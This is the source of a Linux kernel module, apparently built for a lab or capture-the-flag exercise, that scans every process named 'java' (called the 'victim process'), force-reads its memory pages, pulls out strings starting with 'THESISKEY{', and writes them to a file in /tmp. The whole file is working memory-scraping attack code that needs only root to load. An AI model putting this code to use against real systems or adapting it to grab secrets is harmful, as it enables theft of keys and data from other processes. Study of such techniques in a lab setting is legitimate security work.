#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/vmalloc.h>
#include <asm/io.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("researcher");
MODULE_DESCRIPTION("Memory reader for java victim process");

#define OUTPUT_FILE "/tmp/thesis_token.txt"
#define BUF_SIZE (1024 * 1024)  /* 1MB buffer */
#define TOKEN_PREFIX "THESISKEY{"

static void write_to_file(const char *filename, const char *data, size_t len)
{
    struct file *f;
    loff_t pos = 0;

    f = filp_open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(f)) {
        printk(KERN_ERR "memread: cannot open output file\n");
        return;
    }
    kernel_write(f, data, len, &pos);
    filp_close(f, NULL);
}

static void search_vma(struct task_struct *task, struct vm_area_struct *vma)
{
    unsigned long addr;
    char *buf;
    char *token_buf;
    const char *prefix = TOKEN_PREFIX;
    size_t prefix_len = strlen(prefix);

    /* Skip non-readable VMAs */
    if (!(vma->vm_flags & VM_READ))
        return;

    /* Skip very large regions (> 256MB) */
    if ((vma->vm_end - vma->vm_start) > 256 * 1024 * 1024)
        return;

    buf = kvmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!buf)
        return;

    token_buf = kvmalloc(256, GFP_KERNEL);
    if (!token_buf) {
        kvfree(buf);
        return;
    }

    for (addr = vma->vm_start; addr < vma->vm_end; addr += PAGE_SIZE) {
        struct page *page;
        void *kaddr;
        int i;

        /* Try to get the page */
        if (get_user_pages_remote(task->mm, addr, 1, FOLL_FORCE,
                                   &page, NULL, NULL) != 1)
            continue;

        kaddr = kmap_atomic(page);
        memcpy(buf, kaddr, PAGE_SIZE);
        kunmap_atomic(kaddr);
        put_page(page);

        /* Search for token prefix in this page */
        for (i = 0; i < PAGE_SIZE - (int)prefix_len; i++) {
            if (memcmp(buf + i, prefix, prefix_len) == 0) {
                /* Found it! Extract the full token */
                int j = i;
                int tok_len = 0;
                char msg[512];

                while (j < PAGE_SIZE && buf[j] != '\0' && buf[j] != '\n' 
                       && tok_len < 255) {
                    token_buf[tok_len++] = buf[j++];
                    if (buf[j-1] == '}') break;
                }
                token_buf[tok_len] = '\n';
                token_buf[tok_len+1] = '\0';

                snprintf(msg, sizeof(msg), "FOUND TOKEN at addr 0x%lx: %s\n",
                         addr + i, token_buf);
                printk(KERN_ALERT "memread: %s", msg);
                write_to_file(OUTPUT_FILE, token_buf, tok_len + 1);
            }
        }
    }

    kvfree(buf);
    kvfree(token_buf);
}

static int __init memread_init(void)
{
    struct task_struct *task;
    char msg[256];

    printk(KERN_ALERT "memread: module loaded, searching for java process\n");
    write_to_file(OUTPUT_FILE, "=== memread module started ===\n", 31);

    rcu_read_lock();
    for_each_process(task) {
        if (strncmp(task->comm, "java", 4) == 0) {
            struct mm_struct *mm;

            snprintf(msg, sizeof(msg), "Found java process: PID=%d comm=%s\n",
                     task->pid, task->comm);
            printk(KERN_ALERT "memread: %s", msg);
            write_to_file(OUTPUT_FILE, msg, strlen(msg));

            mm = get_task_mm(task);
            if (mm) {
                struct vm_area_struct *vma;

                rcu_read_unlock();

                down_read(&mm->mmap_lock);
                for (vma = mm->mmap; vma; vma = vma->vm_next) {
                    search_vma(task, vma);
                }
                up_read(&mm->mmap_lock);

                mmput(mm);

                rcu_read_lock();
            }
        }
    }
    rcu_read_unlock();

    write_to_file(OUTPUT_FILE, "=== memread module done ===\n", 28);
    printk(KERN_ALERT "memread: done\n");

    return 0;
}

static void __exit memread_exit(void)
{
    printk(KERN_ALERT "memread: module unloaded\n");
}

module_init(memread_init);
module_exit(memread_exit);
EOF

